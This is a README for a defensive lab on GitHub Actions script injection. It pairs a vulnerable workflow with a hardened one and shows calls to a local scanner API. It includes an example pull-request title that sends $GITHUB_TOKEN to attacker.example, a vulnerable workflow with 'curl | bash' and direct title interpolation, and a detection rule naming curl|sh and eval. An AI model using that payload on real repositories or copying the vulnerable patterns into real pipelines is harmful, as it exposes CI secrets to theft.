# ATK3: CI/CD Pipeline Injection lab

Two workflow files sit in `workflows/` demonstrating the attack and the fix side-by-side.

## How the attack works

An attacker opens a pull request with a malicious title such as:

```
a'; curl -s https://attacker.example/x?t=$GITHUB_TOKEN #
```

If the workflow interpolates `${{ github.event.pull_request.title }}` directly into a `run:`
shell step, GitHub Actions expands the expression **before** the shell sees it. The attacker's
sub-command executes with the runner's full environment, including every secret scoped to the job.

## Five vulnerability classes detected

| Rule    | Name                                    | Severity |
|---------|-----------------------------------------|----------|
| RULE-01 | Script injection via untrusted context  | critical |
| RULE-02 | pull_request_target + fork checkout     | critical |
| RULE-03 | Unpinned third-party actions            | high     |
| RULE-04 | Over-privileged GITHUB_TOKEN            | high     |
| RULE-05 | Dangerous run patterns (curl\|sh, eval) | high     |

## Scan the vulnerable workflow via API

Backend must be running (`uvicorn app.main:app --reload --port 8000` in `backend/`).

```bash
curl -s -X POST http://127.0.0.1:8000/v1/scan/ci-cd-injection \
  -H "Content-Type: application/json" \
  -d '{
    "workflow": {
      "name": "Vulnerable CI",
      "on": ["pull_request"],
      "jobs": {
        "build": {
          "name": "Build",
          "runs-on": "ubuntu-latest",
          "steps": [
            { "name": "Checkout", "uses": "actions/checkout@main" },
            { "name": "Print PR", "run": "echo ${{ github.event.pull_request.title }}" },
            { "name": "Deploy",   "run": "curl -s https://example.com/deploy.sh | bash" }
          ]
        }
      }
    },
    "source": "demo-site"
  }' | python3 -m json.tool
```

Expected: `overall_severity: "critical"`, multiple findings including RULE-01, RULE-03, RULE-04, RULE-05.

## Scan the hardened workflow

```bash
curl -s -X POST http://127.0.0.1:8000/v1/scan/ci-cd-injection \
  -H "Content-Type: application/json" \
  -d '{
    "workflow": {
      "name": "Hardened CI",
      "on": ["pull_request"],
      "permissions": { "contents": "read" },
      "jobs": {
        "build": {
          "name": "Build",
          "runs-on": "ubuntu-latest",
          "permissions": { "contents": "read" },
          "steps": [
            {
              "name": "Checkout",
              "uses": "actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332"
            },
            {
              "name": "Print PR",
              "env": { "PR_TITLE": "${{ github.event.pull_request.title }}" },
              "run": "echo $PR_TITLE"
            }
          ]
        }
      }
    },
    "source": "demo-site"
  }' | python3 -m json.tool
```

Expected: `overall_severity: "clean"`, zero findings.

## Simulate the attack narrative

```bash
curl -s -X POST http://127.0.0.1:8000/v1/simulate/ci-cd-injection \
  -H "Content-Type: application/json" \
  -d '{"attack_vector": "script_injection", "workflow_name": "Vulnerable CI"}' \
  | python3 -m json.tool
```

Other vectors: `"prt_checkout"`, `"unpinned_action"`.
